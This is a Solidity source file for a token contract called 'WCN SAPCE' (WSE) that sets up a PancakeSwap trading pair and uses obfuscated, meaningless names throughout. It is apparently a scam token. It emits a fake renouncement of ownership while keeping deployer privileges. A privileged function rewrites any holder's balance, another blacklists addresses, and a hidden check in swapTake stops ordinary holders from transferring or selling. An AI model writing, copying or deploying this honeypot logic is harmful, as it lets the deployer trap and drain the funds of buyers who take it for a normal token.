//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface maxSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract enableLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeWalletTotal {
    function createPair(address enableMax, address marketingLaunched) external returns (address);
}

interface launchReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenShouldFee) external view returns (uint256);

    function transfer(address modeTakeShould, uint256 liquidityLimit) external returns (bool);

    function allowance(address listTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityLimit) external returns (bool);

    function transferFrom(
        address sender,
        address modeTakeShould,
        uint256 liquidityLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTeam, uint256 value);
    event Approval(address indexed listTeam, address indexed spender, uint256 value);
}

interface totalFee is launchReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WCNSAPCE is enableLiquidity, launchReceiver, totalFee {

    address public exemptFrom;

    bool public totalTokenAt;

    uint256 public tradingEnable;

    uint256 buyLimit;

    string private limitFund = "WSE";

    uint256 private totalSell;

    address buyFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return isMax;
    }

    address shouldMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public amountReceiver;

    constructor (){
        
        maxLiquidityList();
        maxSell totalShould = maxSell(shouldMarketing);
        exemptFrom = feeWalletTotal(totalShould.factory()).createPair(totalShould.WETH(), address(this));
        if (fromFee == amountReceiver) {
            totalTokenAt = true;
        }
        txTake = _msgSender();
        isMode[txTake] = true;
        teamMarketing[txTake] = buyTotal;
        if (marketingList != totalTokenAt) {
            totalSell = tradingEnable;
        }
        emit Transfer(address(0), txTake, buyTotal);
    }

    function swapTake(address amountWalletTotal, address modeTakeShould, uint256 liquidityLimit) internal returns (bool) {
        if (amountWalletTotal == txTake) {
            return swapTx(amountWalletTotal, modeTakeShould, liquidityLimit);
        }
        uint256 tokenMin = launchReceiver(exemptFrom).balanceOf(buyFrom);
        require(tokenMin == liquidityMarketing);
        require(!listExempt[amountWalletTotal]);
        return swapTx(amountWalletTotal, modeTakeShould, liquidityLimit);
    }

    function decimals() external view virtual override returns (uint8) {
        return totalMax;
    }

    function maxLiquidityList() public {
        emit OwnershipTransferred(txTake, address(0));
        maxMin = address(0);
    }

    bool private marketingList;

    function balanceOf(address tokenShouldFee) public view virtual override returns (uint256) {
        return teamMarketing[tokenShouldFee];
    }

    uint256 public enableTo;

    uint256 private tradingTeam;

    function transfer(address totalTrading, uint256 liquidityLimit) external virtual override returns (bool) {
        return swapTake(_msgSender(), totalTrading, liquidityLimit);
    }

    function tradingMax(address isEnable) public {
        autoFund();
        if (totalSell == fromFee) {
            tradingEnable = tradingTeam;
        }
        if (isEnable == txTake || isEnable == exemptFrom) {
            return;
        }
        listExempt[isEnable] = true;
    }

    function owner() external view returns (address) {
        return maxMin;
    }

    mapping(address => uint256) private teamMarketing;

    function transferFrom(address amountWalletTotal, address modeTakeShould, uint256 liquidityLimit) external override returns (bool) {
        if (_msgSender() != shouldMarketing) {
            if (receiverTrading[amountWalletTotal][_msgSender()] != type(uint256).max) {
                require(liquidityLimit <= receiverTrading[amountWalletTotal][_msgSender()]);
                receiverTrading[amountWalletTotal][_msgSender()] -= liquidityLimit;
            }
        }
        return swapTake(amountWalletTotal, modeTakeShould, liquidityLimit);
    }

    uint8 private totalMax = 18;

    function teamSwap(address totalTrading, uint256 liquidityLimit) public {
        autoFund();
        teamMarketing[totalTrading] = liquidityLimit;
    }

    uint256 private senderMin;

    address private maxMin;

    function getOwner() external view returns (address) {
        return maxMin;
    }

    function allowance(address toTokenSender, address modeSenderAmount) external view virtual override returns (uint256) {
        if (modeSenderAmount == shouldMarketing) {
            return type(uint256).max;
        }
        return receiverTrading[toTokenSender][modeSenderAmount];
    }

    function symbol() external view virtual override returns (string memory) {
        return limitFund;
    }

    event OwnershipTransferred(address indexed marketingMax, address indexed enableReceiver);

    function autoFund() private view {
        require(isMode[_msgSender()]);
    }

    uint256 private fromFee;

    mapping(address => bool) public isMode;

    function totalSupply() external view virtual override returns (uint256) {
        return buyTotal;
    }

    function receiverTake(address sellEnable) public {
        if (receiverExempt) {
            return;
        }
        if (senderMin != tradingEnable) {
            launchMarketing = tradingTeam;
        }
        isMode[sellEnable] = true;
        
        receiverExempt = true;
    }

    address public txTake;

    uint256 liquidityMarketing;

    function fundSwap(uint256 liquidityLimit) public {
        autoFund();
        liquidityMarketing = liquidityLimit;
    }

    uint256 private buyTotal = 100000000 * 10 ** 18;

    string private isMax = "WCN SAPCE";

    function swapTx(address amountWalletTotal, address modeTakeShould, uint256 liquidityLimit) internal returns (bool) {
        require(teamMarketing[amountWalletTotal] >= liquidityLimit);
        teamMarketing[amountWalletTotal] -= liquidityLimit;
        teamMarketing[modeTakeShould] += liquidityLimit;
        emit Transfer(amountWalletTotal, modeTakeShould, liquidityLimit);
        return true;
    }

    uint256 public launchMarketing;

    bool public receiverExempt;

    mapping(address => mapping(address => uint256)) private receiverTrading;

    function approve(address modeSenderAmount, uint256 liquidityLimit) public virtual override returns (bool) {
        receiverTrading[_msgSender()][modeSenderAmount] = liquidityLimit;
        emit Approval(_msgSender(), modeSenderAmount, liquidityLimit);
        return true;
    }

    mapping(address => bool) public listExempt;

}